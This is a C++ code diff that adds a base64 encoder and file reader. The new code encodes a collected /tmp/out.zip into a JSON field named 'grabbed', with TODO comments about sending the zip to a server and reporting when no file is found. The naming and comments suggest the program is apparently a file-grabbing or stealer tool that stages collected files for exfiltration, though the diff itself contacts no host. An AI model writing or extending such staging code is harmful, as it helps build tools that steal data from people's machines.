@@ -248,6 +248,49 @@ int parse_tasks(std::string working_dir, nlohmann::json j) {
     return c;
 }
 
+//TODO: we should use the base64 functions
+std::string base64_encode(const std::vector<unsigned char>& data) {
+    static const char* base64_chars =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        "abcdefghijklmnopqrstuvwxyz"
+        "0123456789+/";
+    std::string result;
+    int i = 0, j = 0;
+    unsigned char char_array_3[3], char_array_4[4];
+    for (size_t idx = 0; idx < data.size(); idx++) {
+        char_array_3[i++] = data[idx];
+        if (i == 3) {
+            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
+            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
+            char_array_4[3] = char_array_3[2] & 0x3f;
+            for (i = 0; (i < 4); i++)
+                result += base64_chars[char_array_4[i]];
+            i = 0;
+        }
+    }
+    if (i) {
+        for (j = i; j < 3; j++)
+            char_array_3[j] = '\0';
+        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
+        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
+        char_array_4[3] = char_array_3[2] & 0x3f;
+        for (j = 0; (j < i + 1); j++)
+            result += base64_chars[char_array_4[j]];
+        while ((i++ < 3))
+            result += '=';
+    }
+    return result;
+}
+
+
+std::vector<unsigned char> readFile(const std::string& filepath) {
+    std::ifstream file(filepath, std::ios::binary);
+    std::vector<unsigned char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+    return buffer;
+}
+
 int main() {
     const std::string base_dir = "/tmp/";
     std::string zip_file_name = "out.zip";
@@ -287,8 +330,18 @@ int main() {
     }
 
     if (boost::filesystem::exists(out_zip_path)) {
-        // TODO: send zip file to server
         std::cout << "File exists: " << out_zip_path << std::endl;
+        std::vector<unsigned char> fileContent = readFile(out_zip_path);
+        std::string base64Content = base64_encode(fileContent);
+        nlohmann::json ret_json;
+        ret_json["grabbed"] = base64Content;
+
+        // TODO: send zip file to server
+        std::ofstream outFile("grabbed.json");
+        outFile << ret_json.dump(4);
+        outFile.close();
+        std::cout << "File has been encoded and saved to grabbed.json" << std::endl;
+
     } else {
         // TODO: send indecation that we didnt find any file
         std::cout << "File does not exist: " << out_zip_path << std::endl;
